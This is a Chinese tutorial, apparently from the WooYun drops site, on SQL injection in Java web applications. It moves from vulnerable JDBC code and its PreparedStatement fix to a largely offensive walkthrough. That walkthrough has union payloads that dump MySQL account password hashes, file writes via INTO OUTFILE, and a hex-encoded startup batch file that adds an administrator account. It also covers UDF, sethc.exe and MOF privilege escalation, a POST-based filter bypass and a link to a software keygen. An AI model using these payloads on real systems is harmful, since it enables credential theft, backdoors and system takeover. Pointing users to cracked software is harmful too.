# 攻击JavaWeb应用[3]-SQL注入[1]

> 注:本节重点在于让大家熟悉各种SQL注入在JAVA当中的表现，本想带点ORM框架实例，但是与其几乎无意，最近在学习MongoDb，挺有意思的，后面有机会给大家补充相关。

### 0x00 JDBC和ORM

* * *

#### JDBC:

JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问。

#### JPA:

JPA全称Java Persistence API.JPA通过JDK 5.0注解或XML描述对象－关系表的映射关系，并将运行期的实体对象持久化到数据库中。是一个ORM规范。Hibernate是JPA的具体实现。但是Hibernate出现的时间早于JPA（因为Hibernate作者很狂，sun看不惯就叫他去制定JPA标准去了哈哈）。

#### ORM:

对象关系映射（ORM）目前有Hibernate、OpenJPA、TopLink、EclipseJPA等实现。

#### JDO:

JDO(Java Data Object )是Java对象持久化的新的规范，也是一个用于存取某种数据仓库中的对象的标准化API。没有听说过JDO没有关系，很多人应该知道PDO,ADO吧？概念一样。

#### 关系:

JPA可以依靠JDBC对JDO进行对象持久化，而ORM只是JPA当中的一个规范，我们常见的Hibernate、Mybatis和TopLink什么的都是ORM的具体实现。

概念性的东西知道就行了，能记住最好。很多东西可能真的是会用，但是要是让你去定义或者去解释的时候发现会有些困难。

重点了解JDBC是个什么东西，知道Hibernate和Mybatis是ORM的具体的实现就够了。

#### Object:

在Java当中Object类（java.lang.object）是所有Java类的祖先。每个类都使用 Object 作为超类。所有对象（包括数组）都实现这个类的方法。所以在认识Java之前应该有一个对象的概念。

#### 关系型数据库和非关系型数据库：

数据库是按照数据结构来组织、存储和管理数据的仓库。

关系型数据库，是建立在关系模型基础上的数据库。关系模型就是指二维表格模型,因而一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。当前主流的关系型数据库有Oracle、DB2、Microsoft SQL Server、Microsoft Access、MySQL等。

NoSQL，指的是非关系型的数据库。随着互联网web2.0网站的兴起，传统的关系数据库在应付web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，暴露了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。

```
1、High performance - 对数据库高并发读写的需求。
2、Huge Storage - 对海量数据的高效率存储和访问的需求。
3、High Scalability && High Availability- 对数据库的高可扩展性和高可用性的需求。

```

常见的非关系型数据库:Membase、MongoDB、Hypertable、Apache Cassandra、CouchDB等。

常见的NoSQL数据库端口：

```
MongoDB:27017、28017、27080
CouchDB:5984
Hbase:9000
Cassandra:9160
Neo4j:7474
Riak:8098

```

在引入这么多的概念之后我们今天的故事也就要开始了,概念性的东西后面慢慢来。引入这些东西不只仅仅是为了讲一个SQL注入，后面很多地方可能都会用到。

传统的JDBC大于要经过这么些步骤完成一次查询操作，java和数据库的交互操作:

```
准备JDBC驱动
加载驱动
获取连接
预编译SQL
执行SQL
处理结果集
依次释放连接

```

sun只是在JDBC当中定义了具体的接口，而JDBC接口的具体的实现是由数据库提供厂商去写具体的实现的， 比如说Connection对象，不同的数据库的实现方式是不同的。

使用传统的JDBC的项目已经越来越少了，曾经的model1和model2已经被MVC给代替了。如果用传统的JDBC写项目你不得不去管理你的数据连接、事物等。而用ORM框架一般程序员只用关心执行SQL和处理结果集就行了。比如Spring的JdbcTemplate、Hibernate的HibernateTemplate提供了一套对dao操作的模版，对JDBC进行了轻量级封装。开发人员只需配置好数据源和事物一般仅需要提供一个SQL、处理SQL执行后的结果就行了，其他的事情都交给框架去完成了。

￼![enter image description here](http://drops.javaweb.org/uploads/images/bc10a1e1fb7554b033559406abbc53e71db63c60.jpg)

### 0x01 经典的JDBC的Sql注入

* * *

Sql注入产生的直接原因是拼凑SQL，绝大多数程序员在做开发的时候并不会去关注SQL最终是怎么去运行的，更不会去关注SQL执行的安全性。因为时间紧，任务重完成业务需求就行了，谁还有时间去管你什么SQL注入什么？还不如喝喝茶，看看妹子。正是有了这种懒惰的程序员SQL注入一直没有消失，而这当中不乏一些大型厂商。有的人可能心中有防御Sql注入意识，但是在面对复杂业务的时候可能还是存在侥幸心理，最近还是被神奇路人甲给脱裤了。为了处理未知的SQL注入攻击，一些大厂商开始采用SQL防注入甚至是使用某些厂商的WAF。

#### JDBCSqlInjectionTest.java类：

```
package org.javaweb.test;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

public class JDBCSqlInjectionTest {

    /**
     * sql注入测试
     * @param id
     */
    public static void sqlInjectionTest(String id){

        String MYSQLDRIVER = "com.mysql.jdbc.Driver";//MYSQL驱动
        //Mysql连接字符串
        String MYSQLURL = "jdbc:mysql://localhost:3306/wooyun?user=root&password=caonimei&useUnicode=true&characterEncoding=utf8&autoReconnect=true";
        String sql = "SELECT * from corps where id = "+id;//查询语句
        try {
            Class.forName(MYSQLDRIVER);//加载MYSQL驱动
            Connection conn = DriverManager.getConnection(MYSQLURL);//获取数据库连接
            PreparedStatement pstt = conn.prepareStatement(sql);
            ResultSet rs = pstt.executeQuery();
            System.out.println("SQL:"+sql);//打印SQL
            while(rs.next()){//结果遍历
                System.out.println("ID:"+rs.getObject("id"));//ID
                System.out.println("厂商:"+rs.getObject("corps_name"));//输出厂商名称
                System.out.println("主站"+rs.getObject("corps_url"));//厂商URL
            }
            rs.close();//关闭查询结果集
            pstt.close();//关闭PreparedStatement
            conn.close();//关闭数据连接
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        sqlInjectionTest("2 and 1=2 union select version(),user(),database(),5 ");//查询id为2的厂商
    }
}

```

现在有以下Mysql数据库结构(后面用到的数据库结构都是一样)： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/e2f07092ff15a012ca2b0c1a21fc82cd075e5632.jpg)

看下图代码是一个取数据和显示数据的过程。

第20行就是典型的拼SQL导致SQL注入，现在我们的注入将围绕着20行展开： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/b2847d7b7f85e6e6b087f536ad780324dc998297.jpg)

当传入正常的参数”2”时输出的结果正常：

￼![enter image description here](http://drops.javaweb.org/uploads/images/86f3b4426a53070c9c60be208aa6916c2167e9ec.jpg)

当参数为`2 and 1=1`去查询时，由于1=1为true所以能够正常的返回查询结果：

￼![enter image description here](http://drops.javaweb.org/uploads/images/11d59f0ab0e86aa01f2b26b39279e85dbd03735e.jpg)

当传入参数`2 and 1=2`时查询结果是不存在的，所以没有显示任何结果。

Tips:在某些场景下可能需要在参数末尾加注释符--,使用“--”的作用在于注释掉从当前代码末尾到SQL末尾的语句。

--在oracle和mssql都可用，mysql可以用`#``/**`。

￼![enter image description here](http://drops.javaweb.org/uploads/images/05e1de23cca2bfadcaf3533d5c637bcea30ca631.jpg)

执行order by 4正常显示数据order by 5错误说明查询的字段数是4。 ￼

![enter image description here](http://drops.javaweb.org/uploads/images/81991a441fdf29a13b6ea78ac8b6defdf3c394f5.jpg)

Order by 5执行后直接爆了一个SQL异常： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/38c5a02db334f231e85f3a0124f0b6f44c90ab18.jpg)

用联合查询执行:`2 and 1=2 union select version(),user(),database(),5 ￼`

![enter image description here](http://drops.javaweb.org/uploads/images/c75e27b5f83ff6531fd9a79bd4d07c30f8462de2.jpg)

#### 小结论：

通过控制台执行SQL注入可知SQL注入跟平台无关、跟开发语言关系也不大，而是跟数据库有关。 知道了拼SQL肯定是会造成SQL注入的，那么我们应该怎样去修复上面的代码去防止SQL注入呢？其实只要把参数经过预编译就能够有效的防止SQL注入了，我们已经依旧提交SQL注入语句会发现之前能够成功注入出数据库版本、用户名、数据库名的语句现在无法带入数据库查询了：

![enter image description here](http://drops.javaweb.org/uploads/images/22605e197012580b677e19a7bb30bb5f76952813.jpg)

### 0x02 PreparedStatement实现防注入

* * *

SQL语句被预编译并存储在PreparedStatement对象中。然后可以使用此对象多次高效地执行该语句。

```
Class.forName(MYSQLDRIVER);//加载MYSQL驱动 
Connection conn = DriverManager.getConnection(MYSQLURL);//获取数据库连接 
String sql = "SELECT * from corps where id = ? ";//查询语句 
PreparedStatement pstt = conn.prepareStatement(sql);//获取预编译的PreparedStatement对象 
pstt.setObject(1, id);//使用预编译SQL 
ResultSet rs = pstt.executeQuery();

```

￼![enter image description here](http://drops.javaweb.org/uploads/images/d315e32405aeaaafa1d9fc8bbe32ddf31a350e1b.jpg)

从Class.forName反射去加载MYSQL启动开始，到通过DriverManager去获取一个本地的连接数据库的对象。而拿到一个数据连接以后便是我们执行SQL与事物处理的过程。当我们去调用PreparedStatement的方法如：executeQuery或executeUpdate等都会通过mysql的JDBC实现对Mysql数据库做对应的操作。Java里面连接数据库的方式一般来说都是固定的格式，不同的只是实现方式。所以只要我们的项目中有加载对应数据库的jar包我们就能做相应的数据库连接。而在一个Web项目中如果/WEB-INF/lib下和对应容器的lib下只有mysql的数据库连接驱动包，那么就只能连接MYSQL了，这一点跟其他语言有点不一样，不过应该容易理解和接受，假如php.ini不开启对mysql、mssql、oracle等数据库的支持效果都一样。修复之前的SQL注入的方式显而易见了，`用“？”号去占位，预编译SQL的时候会自动根据pstt里的参数去处理，从而避免SQL注入。`

```
String sql = "SELECT * from corps where id = ? "; 
pstt = conn.prepareStatement(sql);//获取预编译的PreparedStatement对象 
pstt.setObject(1, id);//使用预编译SQL 
ResultSet rs = pstt.executeQuery(); 

```

在通过conn.prepareStatement去获取一个PreparedStatement便会以预编译去处理查询SQL，而使用conn.createStatement得到的只是一个普通的Statement不会去预编译SQL语句，但Statement执行效率和速度都比prepareStatement要快前者是后者的父类。

从类加载到连接的关闭数据库厂商根据自己的数据库的特性实现了JDBC的接口。类加载完成之后才能够继续调用其他的方法去获取一个连接对象，然后才能过去执行SQL命令、返回查询结果集(ResultSet)。

Mysql的Driver：

```
public class Driver extends NonRegisteringDriver implements java.sql.Driver{}

```

在加载驱动处下断点（22行），可以跟踪到mysql的驱动连接数据库到获取连接的整个过程。

![enter image description here](http://drops.javaweb.org/uploads/images/810a3e2ae5aa721f2a95e8c55f9556df9fec25cb.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/54919aa379473e65b0e6900e8fd831207c57935c.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/e964cfc983c900a98da4a12e27f07f89c022c6f8.jpg)

F5进入到Driver类： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/578e9c1074560ae535478f89e2c97010bece8282.jpg)

驱动加载完成后我们会得到一个具体的连接的对象Connection,而这个Connection包含了大量的信息，我们的一切对数据库的操作都是依赖于这个Connection的：

![enter image description here](http://drops.javaweb.org/uploads/images/250de2ca0145842a4b1fa62330dbdaedb1d8864f.jpg)

`conn.prepareStatement(sql);`

在获取PreparedStatement对象的时进入会进入到Connection类的具体的实现类ConnectionImpl类。

然后调用其prepareStatement方法。 ￼

而nativeSQL方法调用了EscapeProcessor类的静态方法escapeSQL进行转意，返回的自然是转意后的SQL。

预编译默认是在客户端的用`com.mysql.jdbc.PreparedStatement`本地SQL拼完SQL，最终mysql数据库收到的SQL是已经替换了“?”后的SQL，执行并返回我们查询的结果集。 从上而下大概明白了预编译做了个什么事情，并不是用了PreparedStatement这个对象就不存在SQL注入而是跟你在预编译前有没有拼凑SQL语句，

```
String sql = “select * from xxx where id = ”+id//这种必死无疑。

```

#### Web中绕过SQL防注入：

Java中的JSP里边有个特性直接`request.getParameter("Parameter");`去获取请求的数据是不分GET和POST的，而看过我第一期的同学应该还记得我们的Servlet一般都是两者合一的方式去处理的，而在SpringMVC里面如果不指定传入参数的方式默认是get和post都可以接受到。

SpringMvc如：

```
@RequestMapping(value="/index.aspx",method=RequestMethod.GET)
public String index(HttpServletRequest request,HttpServletResponse response){
    System.out.println("------------");
    return "index";
}

```

上面默认只接收GET请求，而大多数时候是很少有人去制定请求的方式的。说这么多其实就是为了告诉大家我们可以通过POST方式去绕过普通的SQL防注入检测！

#### Web当中最容易出现SQL注入的地方：

```
常见的文章显示、分类展示。
用户注册、用户登录处。
关键字搜索、文件下载处。
数据统计处（订单查询、上传下载统计等）经典的如select下拉框注入。
逻辑略复杂处(密码找回以及跟安全相关的)。

```

#### 关于注入页面报错：

如果发现页面抛出异常，那么得从两个方面去看问题，传统的SQL注入在页面报错以后肯定没法直接从页面获取到数据信息。如果报错后SQL没有往下执行那么不管你提交什么SQL注入语句都是无效的，如果只是普通的错误可以根据错误信息进行参数修改之类继续SQL注入。 假设我们的id改为int类型：

```
int id = Integer.parseInt(request.getParameter("id")); ￼

```

![enter image description here](http://drops.javaweb.org/uploads/images/3e782116e5f21e2d1c099e4fe389826cafa1bcc8.jpg)

程序在接受参数后把一个字符串转换成int(整型)的时候发生异常，那么后面的代码是不会接着执行的哦，所以SQL注入也会失败。

#### Spring中如何安全的拼SQL(JDBC同理)：

对于常见的SQL注入采用预编译就行了，但是很多时候条件较多或较为复杂的时候很多人都想偷懒拼SQL。 

 写了个这样的多条件查询条件自动匹配：

```
    public static String SQL_FORUM_CLASS_SETTING = "SELECT * from bjcyw_forum_forum where 1=1 ";
     public List<Map<String, Object>> getForumClass(Map<String,Object> forum) {
    StringBuilder sql=new StringBuilder(SQL_FORUM_CLASS_SETTING);
    List<Object> ls=new ArrayList<Object>();
    if (forum.size()>0) {
        for (String key : forum.keySet()) {
            Object obj[]=(Object [])forum.get(key);
            sql = SqlHelper.selectHelper(sql, obj);
            if ("like".equalsIgnoreCase(obj[2].toString().trim())) {
                ls.add("%"+obj[1]+"%");
            }else{
                ls.add(obj[1]);
            }
        }
    }
    return jdbcTemplate.queryForList(sql.toString(),(Object[])ls.toArray());
}

```

selectHelper方法：

```
public static StringBuilder selectHelper(StringBuilder sql, Object obj[]){
    if (Constants.SQL_HELPER_LIKE.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" like ?");
    }else if (Constants.SQL_HELPER_EQUAL.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" = ?");
    }else if (Constants.SQL_HELPER_GREATERTHAN.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" > ?");
    }else if (Constants.SQL_HELPER_LESSTHAN.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" < ?");
    }else if (Constants.SQL_HELPER_NOTEQUAL.equalsIgnoreCase(obj[2].toString())) {
        sql.append(" AND "+obj[0]+" != ?");
    }
    return sql;
}

```

信任客户端的参数一切参数只匹配查询条件，把参数和条件自动装配到框架。

如果客户端提交了危险的SQL也没有关系在query的时候是会预编译。

不贴了原文在：[http://zone.wooyun.org/content/2448](http://zone.wooyun.org/content/2448)

### 0x03 转战Web平台

* * *

看完了SQL注入在控制台下的表现，如果对上面还不甚清楚的同学继续看下面的Web注入。

首先我们了解下Web当中的SQL注入产生的原因: ￼

![enter image description here](http://drops.javaweb.org/uploads/images/535510341834dba60fd078571ebc6de99f79a635.jpg)

Mysql篇： 数据库结构上面已经声明，现在有以下Jsp页面，逻辑跟上面注入一致： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/c5112759bc32b77409286641fb8b3ddedb72c053.jpg)

浏览器访问：http://localhost/SqlInjection/index.jsp?id=1

![enter image description here](http://drops.javaweb.org/uploads/images/ce663ec4494cbe29c330b6bcc24a99871d5d3b53.jpg)

上面我们已经知道了查询的字段数是4，现在构建联合查询，其中的1，2，3只是我们用来占位查看字段在页面对应的具体的输出。在HackBar执行我们的SQL注入，查看效果和执行情况： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/ddc5f7c1b2508f1ace8c4adc180a9accf5bc5efb.jpg)

#### Mysql查询和注入技巧：

只要是从事渗透测试工作的同学或者对Web比较喜爱的同学强荐大家学习下SQL语句和Web开发基础，SQL管理客户端有一个神器叫Navicat。支持MySQL, SQL Server, SQLite, Oracle 和 PostgreSQL databases。官方下载地址：[http://www.navicat.com/download](http://www.navicat.com/download)不过需要注册，注册机：[http://pan.baidu.com/share/link?shareid=271653&uk=1076602916](http://pan.baidu.com/share/link?shareid=271653&uk=1076602916)其次是下载吧有全套的下载。

![enter image description here](http://drops.javaweb.org/uploads/images/e6e7589a5c75d1e9cc56e3f5be87774bca639d5a.jpg)

似乎很多人都知道Mysql有个数据库叫information_schema里面存储了很多跟Mysql有关的信息，但是不知道里面具体都有些什么，有时间大家可以抽空看下。Mysql的sechema都存在于此，包含了字段、表、元数据等各种信息。也就是对于Mysql来说创建一张表后对应的表信息会存储到information_schema里面，而且可以用SQL语句查询。

使用Navicat构建SQL查询语句：

![enter image description here](http://drops.javaweb.org/uploads/images/5752e156ccf49e9e5493d6a577da64341c9064cb.jpg)

当我们在SQL注入当中找到用户或管理员所在的表是非常重要的，而当我们想要快速找到跟用户相关的数据库表时候在Mysql里面就可以合理的使用information_schema去查询。构建SQL查询获取所有当前数据库当中数据库表名里面带有user关键字的演示： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/c0a4a7b55a04cf55b2748bdabc1f9f1aac2dbd8d.jpg)

查询包含user关键字的表名的结果： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/57df2e1374c188a49ceef66822ea9c326cbc9c9b.jpg)

假设已知某个网站用户数据非常大，我们可以通过上面构建的SQL去找到对应可能存在用户数据信息的表。

查询Mysql所有数据库中所有表名带有user关键字的表，并且按照表的行数降序排列：

```
SELECT
i.TABLE_NAME,i.TABLE_ROWS
FROM information_schema.`TABLES` AS i
WHERE i.TABLE_NAME
LIKE '%user%'
ORDER BY i.TABLE_ROWS
DESC

```

查只在当前数据库查询：

```
SELECT
i.TABLE_NAME,i.TABLE_ROWS
FROM information_schema.`TABLES` AS i
WHERE i.TABLE_NAME
LIKE '%user%'
AND i.TABLE_SCHEMA = database()
ORDER BY i.TABLE_ROWS
DESC

```

查询指定数据库： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/eb6fad068d7ef1afda999ab16ba4c70cad598e22.jpg)

查询字段当中带有user关键字的所有的表名和数据库名：

```
SELECT
i.TABLE_SCHEMA,i.TABLE_NAME,i.COLUMN_NAME
FROM information_schema.`COLUMNS` AS i
WHERE i.COLUMN_NAME LIKE '%user%' ￼

```

![enter image description here](http://drops.javaweb.org/uploads/images/213dcfa33bf56281e4fca2203aa019a43fa9b5a9.jpg)

#### CONCAT：

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1￼

```

![enter image description here](http://drops.javaweb.org/uploads/images/ca36a342cd56dd2fc3bfac2377521d56323bf71a.jpg)

#### GROUP_CONCAT

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,GROUP_CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1

```

![enter image description here](http://drops.javaweb.org/uploads/images/6c0093eaaade64fedd3f4b7e2ffa9b8938ad5186.jpg)

#### 注入点友情备份:

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select '','',corps_name,corps_url from corps into outfile'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/1.txt'

```

注入在windows下默认是E:\如果用“\”去表示路径的话需要转换成`E:\\`而更方便的方式是直接用/去表示即E:/。 当我们知道WEB路径的情况下而又有outfile权限直接导出数据库中的用户信息。￼

![enter image description here](http://drops.javaweb.org/uploads/images/a3ed069e5578a288f93587b66150c7092a50ac27.jpg)

而如果是在一些极端的情况下无法直接outfile我们可以合理的利用concat和GROUP_CONCAT去把数据显示到页面，如果数据量特别大，我们可以用concat加上limit去控制显示的数量。比如每次从页面获取几百条数据？写一个工具去请求构建好的SQL注入点然后把页面的数据取下来，那么数据库的表信息也可以直接从注入点全部取出来。

#### 注入点root权限提权：

##### 1、写启动项：

这个算是非常简单的了，直接写到windows的启动目录就行了，我测试的系统是windows7直接写到:C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup目录就行了。用HackBar去请求一下链接就能过把bat写入到我们的windows的启动菜单了，不过得注意的是360那个狗兔崽子：

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 0x6E65742075736572207975616E7A20313233202F6164642026206E6574206C6F63616C67726F75702061646D696E6973747261746F7273207975616E7A202F616464,'','','' into outfile 'C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.bat'

```

![enter image description here](http://drops.javaweb.org/uploads/images/b17258c45ef486662210b7de961a9c30a3f764d9.jpg)

##### 2、失败的注入点UDF提权尝试：

MYSQL提权的方式挺多的，并不局限于udf、mof、写windows启动目录、SQL语句替换sethc实现后门等，这里以udf为例，其实udf挺麻烦的，如果麻烦的东东你都能搞定，简单的自然就能过搞定了。 在进行mysql的udf提权的时候需要注意的是mysql的版本，mysql5.1以下导入到windows目录就行了，而mysql<=5.1需要导入到插件目录。我测试的是Mysql 5.5.27我们的首要任务就是找到mysql插件路径。

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,@@plugin_dir

```

获取插件目录方式：

```
select @@plugin_dir
select @@basedir
 show variables like ‘%plugins%’

```

![enter image description here](http://drops.javaweb.org/uploads/images/2c880d25485ea18c971d294a1da71784b33c3481.jpg)

通过MYSQL预留的变量很轻易的就找到了mysql所在目录，那我们需要把udf导出的绝对路径就应该是：`D:/install/dev/mysql5.5/lib/plugin/udf.dll`。现在我们要做的就是怎样通过SQL注入去把这udf导出到上述目录了。 我先说下我是怎么从错误的方法到正确导入的一个过程吧。首先我执行了这么一个SQL：

```
SELECT * from corps where id = 1 and 1=2 union select '','','',(CONVERT(0xudf的十六进制 ,CHAR)) INTO DUMPFILE 'D:/install/dev/mysql5.5/lib/plugin/udf.dll'

```

因为在命令行或执行单条语句的时候转换成char去dumpfile的时候是可以成功导出二进制文件的。 我们用浏览器浏览网页的时候都是以GET方式去提交的，而如果我用GET请求去传这个十六进制的udf的话显然会超过GET请求的限制，于是我简单的构建了一个POST请求去把一个110K的0x传到后端。

![enter image description here](http://drops.javaweb.org/uploads/images/c2793b1abd8bd77e33a3d60890767b02db4150bb.jpg)

用hackbar去发送一个post请求发现失败了，一定是我打开方式不对，呵呵。随手写了个表单提交下： 下载地址:[http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916￼](http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916)

![enter image description here](http://drops.javaweb.org/uploads/images/5e8e67ff2d695fbd869e82363a5566d1d5a857f7.jpg)

提交表单以后发现文件是写进去了，但是为什么就只有84字节捏？ ￼

![enter image description here](http://drops.javaweb.org/uploads/images/e57c361abe6a24f7b1ab3c0699a7dde63c5e0b22.jpg)

难道是数据传输的时候被截断了？不至于吧，于是用navicat执行上面的语句： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/a4c51c4ae4eb8efd9da79a6282baf33c6ba16f63.jpg)

我似乎傻逼了，因为查询结果还是只有84字节，结果显然不是我想要的。84字节，不带这么坑的。一计不成又生二计。 不让我直接dumpfile那我间接的去写总行吧？ ￼

![enter image description here](http://drops.javaweb.org/uploads/images/64d5996a922f3369b863ed7ce1e446d31e32a61e.jpg)

1 and 1=2 union select '','','',0xUDF转换后的16进制 INTO outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'发现格式不对，给hex加上单引号以字符串方式写入试下: 1 and 1=2 union select '','','',’0xUDF转换后的16进制’ INTO outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'

![enter image description here](http://drops.javaweb.org/uploads/images/5d5498a2a6e42176f9a05a86b353a5b462c3b030.jpg)

这次写入的起码是hex了吧，再load_file到查询里面不就行了吗？我们知道load_file得到的肯定是一个blob吧。 ￼

![enter image description here](http://drops.javaweb.org/uploads/images/c9dbbeb5ce27c448e0c258e3fc574d536cd32851.jpg)

那么在注入点这么去构建一下不就行了： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/3e641714b6883aadd8d44e86dfe3904dc6a29a80.jpg)

其实这都已经2到家了，这跟第一次提交的数据根本就没有两样。Load file在这里依旧被转换成了0x，我想这不行的话那么应该就只能在blob字段去load_file才能成功吧，因为现在load到了一个字段类型是text的位置里面。估计是被当字符串处理了，但是很显然是没法去找个blob的字段的，(用上面去information_schema去找应该能找到)。也就是说现在需要的是一个blob去临时的存储一下。又因为我们知道MYSQL是不支持多行查询的，所以我们根本就没有办法去建表(想过copy查询建表，但是显然是行不通的)。 这不科学，一定是打开方式不对。CAST 和CONVERT 转换成CHAR都不行。能转换成blob之类的吗？CONVERT(0xsbsbsb,BLOB)发现失败了，把BLOB换成 BINARY发现成功执行了。 于是用构建的表单再次执行下面的语句：`SELECT * from corps where id = 1 and 1=2 union select '','','', CONVERT(0x不解释,BINARY) INTO DUMPFILE'D:/install/dev/mysql5.5/lib/plugin/udf.dll'`

![enter image description here](http://drops.javaweb.org/uploads/images/5225797ea564b187f4237deb52b90adb2b9c6240.jpg)

这次执行成功了，哦多么痛的领悟……一开始把CHAR写成BINARY不就搞定了，二的太明显了。其实上面的二根本就不是事儿，更二的是当我要执行的时候恍然发现根本就没有办法去创建function啊！ O shit shift~ Mysql Driver在pstt.executeQuery()是不支持多行查询的，一个select 在怎么也不能跟create同时执行。为了不影响大家心情还是继续写下去吧，命令行建立一个function，然后在注入点注入（如果有前人已经创建udf的情况下可以直接利用）： ￼

![enter image description here](http://drops.javaweb.org/uploads/images/2dde11fe6bd1ed937790f3a5623250bd42f995ce.jpg)

因为没有办法去创建一个function所以用注入点实现udf提权在上一步就死了，通过在命令行执行创建function只能算是心灵安慰了，只要完成了create function那一步我们就真的成功了，因为调用自定义function非常简单：

![enter image description here](http://drops.javaweb.org/uploads/images/72cf21cb3389735b836fff80118f0e63350a80b5.jpg)

#### MOF和sethc提权：

MOF和sethc提权我就不详讲了，因为看了上面的udf提权你已经具备自己导入任意文件到任意目录了，而MOF实际上就是写一个文件到指定目录，而sethc提权我只成功模糊的过一次。在命令行下利用SQL大概是这样的：

```
create table mix_cmd( shift longblob);
insert into mix_cmd values(load_file(‘c:\windows\system32\cmd.exe’));     
select * from mix_cmd into dumpfile ‘c:\windows\system32\sethc.exe’;     
drop table if exists mix_cmd;

```

现在的管理员很多都会自作聪明的去把net.exe、net1.exe 、cmd.exe、sethc.exe删除防止入侵。当sethc不存在时我们可以用这个方法去试下，怎么确定是否存在?load_file下看人品了,如果cmd和sethc都不存在那么按照上面的udf提权三部曲上传一个cmd.exe到任意目录。

```
SELECT LOAD_FILE('c:/windows/system32/cmd.exe') INTO DUMPFILE'c:/windows/system32/sethc.exe'

```

MOF大约是这样：

```
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select char(ascii转换后的代码),'','','' into dumpfile 'c:/windows/system32/wbem/mof/nullevts.mof'

```

#### Mysql小结：

我想讲的应该是一种方法而不是SQL怎么去写，学会了方法自然就会自己去拓展，当然了最好不要向上面udf那么二。有了上面的demo相信大家都会知道怎么去修改满足自己的需求了。学的不只是方法而是思路切记！